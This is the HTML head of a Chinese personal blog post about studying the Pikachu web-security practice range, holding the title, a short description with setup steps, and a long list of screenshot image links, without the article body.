<!DOCTYPE html>

<html lang="zh-CN">

<head>
    
    <title>pikachu靶场的学习 - Jay的个人博客</title>
    <meta charset="UTF-8">
    <meta name="description" content="记录分享学习">
    <meta name="keywords" content="记录,学习,分享">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    
    

    <link rel="shortcut icon" href="/assets/logoko.png" type="image/png" />
    <meta name="description" content="pikachu靶场的学习pikachu介绍pikachu是一个网络安全学习的靶场，集合了常见web安全的漏洞，很适合初学者进行学习。 pikachu靶场下载链接为： https:&#x2F;&#x2F;github.com&#x2F;zhuifengshaonianhanlu&#x2F;pikachu  pikachu靶场的搭建首先下载安装phpstudy，从下载链接中下载好pikachu源码，解压到phpstudy的www目录下，完成">
<meta property="og:type" content="article">
<meta property="og:title" content="pikachu靶场的学习">
<meta property="og:url" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="Jay的个人博客">
<meta property="og:description" content="pikachu靶场的学习pikachu介绍pikachu是一个网络安全学习的靶场，集合了常见web安全的漏洞，很适合初学者进行学习。 pikachu靶场下载链接为： https:&#x2F;&#x2F;github.com&#x2F;zhuifengshaonianhanlu&#x2F;pikachu  pikachu靶场的搭建首先下载安装phpstudy，从下载链接中下载好pikachu源码，解压到phpstudy的www目录下，完成">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/1.jpg">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-17-20.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-29-43.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-33-49.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-41-08.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-45-33.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-50-31.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-59-26.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-17-18-03.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-17-35-28.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-17-37-29.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-39-04.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-40-08.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-45-25.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-51-55.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-57-39.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-03-29.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-08-49.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-11-44.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-17-44.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-18-55.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-24-17.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-26-08.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-31-16.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-34-12.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-35-40.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-39-20.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-40-51.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-41-55.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-13-16-47.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-29-09.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-32-04.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-40-21.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-38-13.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-42-23.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-03-40.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-18-02.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-19-25.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-20-38.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-23-41.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-25-32.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-30-43.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-34-24.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-56-44.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-07-54.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-14-13.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-18-27.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-29-39.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-34-10.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-17-12-22.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-17-16-06.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-18-45-29.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-18-52-10.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-18-54-17.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-37-26.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-39-20.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-41-18.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-42-55.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-52-26.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-11-01.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-13-18.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-16-07.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-19-20.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-22-31.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-24-29.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-26-17.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-17-52-58.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-36-24.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-43-43.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-55-48.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-57-18.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-19-01-00.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-19-34-53.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-19-55-13.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-04-12.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-10-06.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-17-18.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-38-00.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-42-08.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-46-47.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-21-13-19.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-56-27.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-21-28-28.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-11-27.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-16-37.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-15-47.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-26-24.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-37-22.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-50-55.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-52-57.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-12-36-56.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-23-34.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-47-51.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-29-50.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-50-28.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-34-35.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-37-36.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-16-47.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-48-42.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-53-28.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-57-21.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-05-52.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-09-07.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-12-58.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-14-25.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-20-01.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-27-09.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-51-29.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-52-35.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-56-18.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-30-03.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-33-16.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-52-32.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-55-24.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-28-40.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-29-34.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-37-21.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-41-56.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-47-46.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-49-47.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-19-32-20.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-19-33-09.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-19-34-53.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-20-06-02.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-20-33-03.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-20-35-36.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-21-43-22.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-10-28-34.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-10-33-15.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-10-36-56.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-12-13-34.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-12-52-17.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-13-32-22.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-13-40-53.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-13-41-56.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-03-01.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-04-52.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-07-33.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-10-26.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-13-08.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-15-32.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-26-57.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-58-09.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-21-50.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-28-22.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-35-23.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-39-26.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-46-44.png">
